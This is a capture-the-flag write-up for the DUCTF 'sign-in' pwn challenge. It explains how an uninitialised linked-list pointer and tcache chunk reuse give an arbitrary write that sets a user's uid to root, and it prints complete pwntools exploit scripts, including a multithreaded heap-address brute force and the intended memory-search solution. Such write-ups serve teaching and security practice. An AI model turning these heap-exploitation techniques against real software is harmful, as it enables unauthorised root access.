# sign-in \[181 Points] (95 Solves)
```
Please sign in as root to get a shell.
```
Attached are [two files](./attachment).

---

## Writeup
First, checksec
```
$ checksec sign-in
[*] './sign-in'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

No PIE? Interesting. Let's look at [sign-in.c](./attachment/sign-in.c).

In the given program we can sign up, sign in and remove accounts we are signed into.
Also, if our `uid` is `0`, we may get shell.

```c
int menu() {
    int choice;
    puts("1. Sign up");
    puts("2. Sign in");
    puts("3. Remove account");
    puts("4. Get shell");
    printf("> ");
    scanf("%d", &choice);
    return choice;
}
```

In the sign-up process, we may notice that the `entry->next` field isn't initialized
```c
void sign_up() {
    user_t* user = malloc(sizeof(user_t));
    user_entry_t* entry = malloc(sizeof(user_entry_t));
    user->uid = UID++;
    printf("username: ");
    read(0, user->username, 8);
    printf("password: ");
    read(0, user->password, 8);
    entry->user = user;

    user_entry_t* curr = &user_list;
    while(curr->next) {
        curr = curr->next;
    }
    entry->prev = curr;
    curr->next = entry;
}
```

Now you may notice that `sign_up` mallocs first the user and then the entry. \
Interestingly, when a user is deleted they are freed in the same order. \
This causes the password of the removed user, to be the `entry->next` of the
user created after the previous user's removal.

### Why?
When the first user is deleted (and it's data freeed) there's no free chunks yet,
so the malloc algorithm takes them from the free heap portion
Now in the heap looks like
```
----
... // Previous heap stuff, all alocated
----
user
----
entry
----
free heap portion
```

When you remove you do
```c
free(curr->user);
free(curr);
```
So it first adds `user` to the `tchachebin` (a linked list of small free heap structures),
and then `entry` So the bin looks like
```
... <-> user <-> entry <-> ...
```

`...` are ephemeral nodes.

Then when we add a new user, malloc uses the last node in the list first (like a stack) \
So the first chunk for `user` will be the past `entry`
(And the next chunk for `entry` will be past `user`) \
Then the heap will look like

```
----
...
----
new entry (old user)
----
new user (old entry)
----
free chunk
```

Now because `entry->next` isn't initialized, it will use whatever was there before it. \
And that's the value of `user->password` :D

### Back to pwning
Alright, so we can control the `next`, what now? The first thing I though of was the unlink exploit
```c
void remove_account(int uid) {
    user_entry_t* curr = &user_list;
    do {
        if(curr->user->uid == uid) {
            if(curr->prev) {
                curr->prev->next = curr->next;
            }
            if(curr->next) {
                curr->next->prev = curr->prev;
            }
            free(curr->user);
            free(curr);
            break;
        }
        curr = curr->next;
    } while(curr);
}
```
We control `curr->next`, so when `prev` is written, we control where! \
Basically this
```c
if(curr->next) {
    curr->next->prev = curr->prev;
}
```
turns into
```c
if(YOUR_ADDRESS != NULL) {
    *(YOUR_ADDRESS+0x8) = curr->prev;
}
```
The `0x8` is the offset of `->prev` from the `list_entry` struct.

How can we utilize it? We can write into anywhere an address. A heap address. \
What do we know about a heap address? The most significant byte is almost always `0`. \
And what do we know about `uid`? It's a 64 bit little endian integer. Thus if we can do
```c
*(ADDRESS_OF_UID - 7) = heap_address
```
We would set the LSB of `uid` to `0`!

Great! Let's write it. Using `gdb` we find the address on the heap of a user we create and get

```py
# //snip//

io = start()

def sign_up(username, password):
    io.sendlineafter(b"> ", b"1")
    io.sendafter(b"username: ", username.ljust(8, b"\x00"))
    io.sendafter(b"password: ", password.ljust(8, b"\x00"))

def sign_in(username, password):
    io.sendlineafter(b"> ", b"2")

    io.sendafter(b"username: ", username.ljust(8, b"\x00"))
    io.sendafter(b"password: ", password.ljust(8, b"\x00"))

def remove_account():
    io.sendlineafter(b"> ", b"3")

def get_shell():
    io.sendlineafter(b"> ", b"4")

def sign_in_and_remove(username, password):
    sign_in(username, password)
    remove_account()

TARGET_ADDR = 0x4052e0-0x7-0x8 # -0x7 to write only the LSB and -0x8 to account for writing to `->prev` and not directly to our address
TARGET_ADDR_BIN = p64(TARGET_ADDR)

sign_up(b"A", TARGET_ADDR_BIN)
sign_up(b"B", b"b")
sign_in_and_remove(b"A", TARGET_ADDR_BIN)
sign_up(b"A", b"c"*8) # The ->next of this guy will be TARGET_ADDR
sign_in_and_remove(b"A", b"c"*8)
sign_in(b"B", b"b")
get_shell()

io.interactive()
```

**And we got shell locally with ASLR disabled!** Sadly, *with ASLR we can't do it*, **right?** **_Right?_**

### Turns out you can!

I of course, didn't realize it first. *So I spent at least 15
hours trying ~17 completely unique techniques to exploit this bug (including the
intended one, which my solve isn't. Although I was too lazy to write a script for
it. I will talk about the intended solution later.)*

So after *these long 15 hours*, I get to actually check what happens to heap addresses with ASLR but without PIE
```c
$ cat t.c
#include <stdio.h>
#include <stdlib.h>

int main() {
    printf("malloc(20)=%p\n", malloc(20));
}
$ gcc t.c -no-pie
$ ./a.out
malloc(20)=0x1be22a0
$ ./a.out
malloc(20)=0x19f92a0
$ ./a.out
malloc(20)=0x10a42a0
$ gcc t.c
$ ./a.out
malloc(20)=0x635eab6c62a0
$ ./a.out
malloc(20)=0x5f1681e802a0
$ ./a.out
malloc(20)=0x6034565ad2a0
```

Yep, turns out heap with ASLR but without PIE is predictable!

So all we need to do is to take the original exploit, and modify it to bruteforce the heap address!

```py
HEAP_OFFSET = 0x13cc000
TARGET_ADDR = HEAP_OFFSET + 0x2e0 - 0x7 - 0x8
TARGET_ADDR_BIN = p64(TARGET_ADDR)

def exploit(io):
    sign_up(io, b"A", TARGET_ADDR_BIN)
    sign_up(io, b"B", b"b")
    sign_in_and_remove(io, b"A", TARGET_ADDR_BIN)
    sign_up(io, b"A", b"c"*8)
    sign_in_and_remove(io, b"A", b"c"*8)
    sign_in(io, b"B", b"b")
    get_shell(io, )
    io.sendline(b"ls")
    ls = io.recvline()
    io.sendline(b"cat flag*")
    flag = io.recvline()

    with open(f"solved{random.random()}.txt", "wb") as f:
        f.write(ls)
        f.write(b"\n\n")
        f.write(flag)

    log.critical("SOLVED")

    io.interactive()

def try_exploit():
    while True:
        io = start()
        try:
            exploit(io)
        except EOFError:
            print("Nope")
        io.close()

threads = []
for i in range(100):
    thread = threading.Thread(target=try_exploit)
    threads.append(thread)
    thread.start()

for thread in threads:
    thread.join()
```

And after few seconds, we have the flag

[solve.py](./solve.py)

**Flag:** `DUCTF{welcome_root!_9dbfa98e17b7af9dbc1}`

## Intended solution
As I mentioned before, my solution wasn't actually the intended one, but I did
consider the intended in my 17 approaches :D

Basically, instead of performing an unlink exploit, the node we add will already
look like a node of a root user. How? We just need to find an address, such that
it's value will point to a zero and 2 known values afterwards. \
This way we kind of fake a full entry, with a "valid" user struct into which we
can log in.

Now what I didn't do, and the author did, is write a script to search the memory. \
Here it is:
```py
from pwn import u64, p64

dat = open('mem.bin', 'rb').read()
qwords = [u64(dat[i:i+8]) for i in range(0, len(dat), 8)]
for i, qw in enumerate(qwords):
    if 0x400000 <= qw <= 0x405000:
        idx = (qw - 0x400000)//8
        if qwords[idx] == 0:
            print('ok!', hex(0x400000 + 8*i))
```
First using gdb we dump the process memory into `mem.bin`, and then find all 8 byte values
which point to a `0` in the binary itself. \
Then we can
```py
zero_ptr = 0x402eb8
sign_up(b'x', p64(zero_ptr))
sign_in(b'x', p64(zero_ptr))
remove_account()
sign_up(b'x', b'y')
sign_in(p64(0), p64(0))
get_shell()
```
